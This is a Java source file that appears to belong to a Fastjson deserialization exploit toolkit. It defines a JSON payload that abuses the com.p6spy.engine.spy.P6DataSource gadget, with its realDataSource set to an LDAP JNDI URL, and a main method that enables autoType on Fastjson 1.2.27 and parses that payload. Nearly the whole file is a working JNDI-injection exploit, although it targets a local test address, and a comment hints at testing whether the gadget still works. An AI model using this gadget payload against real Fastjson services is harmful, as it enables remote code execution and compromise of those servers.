package fastjsonExp;

import com.p6spy.engine.spy.P6DataSource;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

import java.sql.SQLException;

/**
 * 鸡肋
 * com.p6spy.engine.spy.P6DataSource
 * still work at fastjson ???
 */
public class EXP4p6spy_engine {

    //payload="{\"@type\":\"com.p6spy.engine.spy.P6DataSource\",\"realDataSource\":\"ldap://127.0.0.1:1389/run\"}";
    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"com.p6spy.engine.spy.P6DataSource\",\"realDataSource\":\"ldap://127.0.0.1:1389/run\"}";
    public  void actual_fun(String url) throws SQLException {
        P6DataSource p = new P6DataSource();
        p.setRealDataSource(url);
        p.getConnection();

    }
    public  void actual_fun() throws SQLException {
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4p6spy_engine(){}
    public EXP4p6spy_engine(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
        System.out.println(this.payload);
    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.27");
        myFastjson.mySetAutoType(true);
        EXP4p6spy_engine exp = new EXP4p6spy_engine("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();
    }
}
